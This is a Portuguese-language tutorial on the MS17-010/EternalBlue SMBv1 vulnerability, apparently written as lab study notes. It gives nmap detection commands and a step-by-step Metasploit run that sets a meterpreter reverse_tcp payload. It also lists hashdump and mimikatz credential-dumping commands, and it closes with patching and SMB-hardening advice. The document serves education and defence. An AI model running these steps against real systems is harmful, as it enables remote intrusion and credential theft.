# 🪟 MS17-010 — EternalBlue

## 🧠 O que é MS17-010?

**MS17-010** é o boletim de segurança da Microsoft que corrige vulnerabilidades no **SMBv1 (Server Message Block)**.

Uma das vulnerabilidades mais conhecidas desse boletim é a **CVE-2017-0144**, explorada pelo **EternalBlue**.

A falha ocorre na maneira como o SMBv1 processa determinadas requisições. Em sistemas vulneráveis, um atacante não autenticado poderia enviar pacotes especialmente elaborados e, em determinadas condições, obter **execução remota de código (RCE)**.

---

## ⚙️ Como funciona

De forma simplificada:

```text
Atacante
   │
   │ Pacotes SMB especialmente elaborados
   ▼
Servidor Windows
   │
   ▼
SMBv1 vulnerável
   │
   ▼
Execução de código
```

A vulnerabilidade é especialmente perigosa porque o ataque pode ocorrer **sem autenticação prévia** em determinadas configurações.

---

## 🔎 Identificação

Uma forma de verificar a presença da vulnerabilidade em um laboratório autorizado é:

```bash
nmap -p445 --script smb-vuln-ms17-010 <IP>
```

Também podemos obter informações sobre o sistema e o serviço SMB:

```bash
nmap -O -sV <IP>
```

📌 A detecção por scanner é um indicativo; a confirmação deve considerar versão, patches e configuração do sistema.

# 💥 Exploração com Metasploit

No laboratório, o módulo histórico do Metasploit é:

```text
msfconsole

use exploit/windows/smb/ms17_010_eternalblue
```

Podemos visualizar as opções:

```text
show options
```

E configurar o alvo:

```text
set RHOSTS <IP_DO_ALVO>
set RPORT 445
```

O módulo pode utilizar um payload apropriado ao ambiente, por exemplo:

```text
set payload windows/x64/meterpreter/reverse_tcp
```

Depois:

```text
set LHOST <IP_DA_MAQUINA_DE_TESTE>
set LPORT 4444
```

Verifique as configurações:

```text
show options
```

E execute:

```text
exploit
```

⚠️ O uso deve ser restrito a máquinas próprias, laboratório ou sistemas em que você tenha autorização explícita.

## 🔐 Privilégios

O EternalBlue é uma vulnerabilidade de **execução remota**, e o nível de privilégio obtido depende do cenário e da exploração utilizada.

Não é correto considerar automaticamente que:

```text
EternalBlue = Privilege Escalation
```

São conceitos diferentes:

```text
MS17-010
   │
   └── RCE
        │
        ▼
   Sessão obtida
        │
        ▼
   Pós-exploração
        │
        ├── Enumeração
        ├── Escalada de privilégios
        └── Outras técnicas
```

O módulo:

```text
post/multi/manage/shell_to_meterpreter
```

serve para converter uma shell existente em uma sessão Meterpreter quando suportado; ele **não é o mecanismo responsável pela exploração do MS17-010**.

---

## ⚠️ Comandos sensíveis

O material original também inclui:

```text
meterpreter > hashdump
meterpreter > load mimikatz
```

Esses comandos podem permitir **extração de hashes ou credenciais**, portanto são melhor classificados como **pós-exploração/credential access**, e não como parte do EternalBlue.

---

# 🛡️ Como corrigir?

As principais medidas são:

- Aplicar os patches de segurança da Microsoft;
- **Desabilitar SMBv1** quando não for necessário;
- Bloquear SMB (`TCP/445`) de exposição à Internet;
- Restringir SMB entre segmentos de rede;
- Utilizar firewall e segmentação de rede;
- Manter sistemas legados atualizados ou isolados.

## 📌 Resumo

```text
MS17-010
   │
   ├── SMBv1
   │
   ├── CVE-2017-0144
   │
   └── EternalBlue
          │
          ▼
     RCE remoto
          │
          ▼
    Pós-exploração
```

> **EternalBlue é um exploit associado principalmente à CVE-2017-0144, uma vulnerabilidade crítica do SMBv1 corrigida no boletim MS17-010. A exploração pode permitir execução remota de código em sistemas Windows vulneráveis.**
